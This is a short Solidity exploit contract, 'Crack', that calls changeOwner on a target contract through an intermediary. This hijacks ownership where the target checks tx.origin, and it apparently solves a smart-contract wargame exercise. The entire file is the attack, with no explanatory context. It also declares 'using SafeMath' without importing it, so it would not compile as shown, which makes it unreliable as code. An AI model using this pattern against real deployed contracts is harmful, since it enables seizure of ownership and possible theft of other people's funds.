pragma solidity ^0.6.0;

interface Target {
    function changeOwner(address _owner) external;
}

contract Crack {

    using SafeMath for uint256;

    Target target;

    constructor(address _target) public {
        target = Target(_target);
    }

    function doCrack() external  {
        target.changeOwner(msg.sender);
    }
}